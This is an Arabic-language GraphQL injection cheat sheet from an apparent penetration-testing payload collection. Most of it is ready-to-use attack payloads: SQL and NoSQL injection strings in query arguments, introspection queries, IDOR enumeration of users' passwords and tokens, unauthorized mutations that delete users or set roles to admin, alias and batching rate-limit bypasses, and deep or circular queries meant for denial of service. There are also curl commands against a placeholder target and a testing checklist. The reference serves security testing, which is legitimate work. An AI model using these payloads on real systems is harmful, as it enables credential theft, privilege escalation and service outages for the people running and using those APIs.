<a id="-graphql-injection-cheatsheet"></a>
# 📊 مرجع سريع لحقن GraphQL

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](GraphQL-Injection.el.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

> **توضيح:** أجزاء الاستعلام التي تُشكّل دورات مرفوضة حسب مواصفة GraphQL؛ مثال الحلقة أدناه يختبر سلامة التحقق من الاستعلام، ولا يُفترض أن ينجح ضد تنفيذ متوافق. أما قبول تجميع الطلبات أو شكل الوسائط فيعتمد على الخادم ومخططه. [مواصفة GraphQL: منع دورات الأجزاء](https://spec.graphql.org/October2021/#sec-Fragment-spreads-must-not-form-cycles).

---

<a id="-graphql-basics"></a>
## 🔍 أساسيات GraphQL

<a id="common-endpoints"></a>
### نقاط النهاية الشائعة
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

<a id="request-structure"></a>
### بنية الطلب
```graphql
# استعلام Query
{
  user(id: 1) {
    name
    email
  }
}

# مع اسم العملية
query GetUser {
  user(id: 1) {
    name
  }
}

# عملية تعديل Mutation
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

<a id="-introspection-queries"></a>
## 🎯 استعلامات استكشاف المخطط (Introspection)

<a id="full-schema-introspection"></a>
### استكشاف المخطط كاملًا
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

<a id="query-type-entry-points"></a>
### نوع Query (نقاط الدخول)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

<a id="mutation-type"></a>
### نوع Mutation لتعديل البيانات
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

<a id="all-types"></a>
### جميع الأنواع
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

<a id="specific-type-details"></a>
### تفاصيل نوع محدد
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

<a id="-injection-attacks"></a>
## 💉 هجمات الحقن

<a id="sql-injection-via-graphql"></a>
### حقن SQL عبر GraphQL
```graphql
# في الوسائط
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# باستخدام UNION
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

<a id="nosql-injection"></a>
### حقن NoSQL
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# أو بتنسيق JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

<a id="idor-insecure-direct-object-reference"></a>
### مراجع الكائنات المباشرة غير الآمنة (IDOR)
```graphql
# الوصول إلى بيانات مستخدمين آخرين
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# تعداد جميع المستخدمين
{
  users {
    id
    name
    email
    role
  }
}
```

---

<a id="-authorization-bypass"></a>
## 🔥 تجاوز التفويض

<a id="missing-auth-on-mutations"></a>
### غياب التحقق من الهوية في عمليات Mutation
```graphql
# تجربة عمليات الإدارة بهوية مستخدم عادي
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

<a id="nested-query-bypass"></a>
### التجاوز عبر الاستعلامات المتداخلة
```graphql
# الوصول إلى بيانات حساسة عبر العلاقات
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

<a id="field-suggestion-abuse"></a>
### إساءة استخدام اقتراحات الحقول
```graphql
# إذا كانت الاقتراحات مفعّلة، فجرّب حقولًا غير صالحة
{
  user(id: 1) {
    passwor  # قد يقترح الحقل "password"
  }
}
```

---

<a id="-information-disclosure"></a>
## 🚀 كشف المعلومات

<a id="debug-information"></a>
### معلومات تصحيح الأخطاء
```graphql
# التعداد بالاعتماد على الأخطاء
{
  __typename
}

# استعلام غير صالح للحصول على تتبع المكدس
{
  invalid_field_that_doesnt_exist
}
```

<a id="sensitive-field-discovery"></a>
### اكتشاف الحقول الحساسة
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات التجاوز

<a id="alias-based-bypass"></a>
### التجاوز باستخدام الأسماء المستعارة
```graphql
# تجاوز تحديد معدل الطلبات باستخدام الأسماء المستعارة
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

<a id="batching-attacks"></a>
### هجمات تجميع الطلبات (Batching)
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

<a id="case-manipulation"></a>
### تغيير حالة الأحرف
```graphql
# تجربة حالات أحرف مختلفة
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

<a id="fragment-injection"></a>
### حقن أجزاء الاستعلام (Fragments)
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

<a id="-dos-attacks"></a>
## 💣 هجمات حجب الخدمة (DoS)

<a id="deep-query-attack"></a>
### هجوم الاستعلام العميق
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

<a id="circular-fragment"></a>
### جزء استعلام دائري
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # مرجع دائري
}
```

<a id="large-result-set"></a>
### مجموعة نتائج كبيرة
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

<a id="-testing-tools"></a>
## 🛠️ أدوات الاختبار

<a id="graphql-voyager"></a>
### GraphQL Voyager
```bash
# عرض المخطط بصريًا
https://graphql-kit.com/graphql-voyager/
# لصق نتيجة استكشاف المخطط
```

<a id="inql-burp-extension"></a>
### InQL (إضافة Burp)
```
# الميزات:
- استخراج المخطط
- توليد الاستعلامات
- فحص الثغرات
```

<a id="graphql-cop"></a>
### graphql-cop
```bash
# أداة تدقيق أمني
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

<a id="graphw00f"></a>
### graphw00f
```bash
# التعرف على تطبيق GraphQL من بصمته
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

<a id="altair-graphql-client"></a>
### Altair GraphQL Client
```
# عميل مكتبي للاختبار
https://altairgraphql.dev/
```

---

<a id="-curl-examples"></a>
## 📝 أمثلة cURL

<a id="basic-query"></a>
### استعلام أساسي
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

<a id="with-variables"></a>
### باستخدام المتغيرات
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

<a id="introspection"></a>
### استكشاف المخطط (Introspection)
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

<a id="with-auth"></a>
### مع التحقق من الهوية
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

<a id="-testing-checklist"></a>
## 📋 قائمة التحقق للاختبار

```markdown
## قائمة التحقق لأمن GraphQL

□ تحديد نقاط نهاية GraphQL
□ التحقق من استكشاف المخطط (استخراجه)
□ استخراج جميع استعلامات Query وعمليات Mutation
□ اختبار IDOR في استعلامات الكائنات
□ اختبار التفويض في عمليات Mutation
□ التحقق من حقن SQL/NoSQL في الوسائط
□ اختبار تسرب البيانات عبر الاستعلامات المتداخلة
□ التحقق من تحديد معدل الطلبات (التجاوز بالأسماء المستعارة)
□ اختبار الاستعلامات المجمعة
□ التحقق من وجود حقول حساسة (password, token)
□ اختبار الحد الأقصى لعمق الاستعلام (DoS)
□ التحقق من كشف تفاصيل الأخطاء
□ اختبار نقاط نهاية الاشتراكات (Subscriptions)
```

---

<a id="-common-vulnerabilities-summary"></a>
## 🔗 ملخص الثغرات الشائعة

| الثغرة | الاختبار | الأثر |
|---------------|------|--------|
| **استكشاف المخطط مفعّل** | الاستعلام عن `__schema` | كشف المخطط |
| **IDOR** | تغيير المعرّفات في الاستعلامات | الوصول إلى بيانات مستخدمين آخرين |
| **غياب التحقق من الهوية** | الاستعلام دون رمز وصول | وصول غير مصرح به |
| **SQLi/NoSQLi** | الحقن في الوسائط | اختراق قاعدة البيانات |
| **بيانات زائدة عن الحاجة** | الاستعلام عن الحقول الحساسة | تسرب البيانات |
| **DoS** | استعلامات عميقة أو دائرية | تعطّل الخدمة |
| **إساءة استخدام تجميع الطلبات** | استعلامات متعددة | تجاوز تحديد معدل الطلبات |

---

<a id="-related-payloads"></a>
## 🔗 حمولات ذات صلة

- [حمولات SQLi](./SQLi.ar.md)
- [حقن NoSQL](./NoSQL-Injection.ar.md)
- [أمن واجهات API](../../API-Security/translations/README.ar.md)

---

**العودة إلى الحمولات:** [💉 مجموعة الحمولات](../../README.md#-payloads-collection)
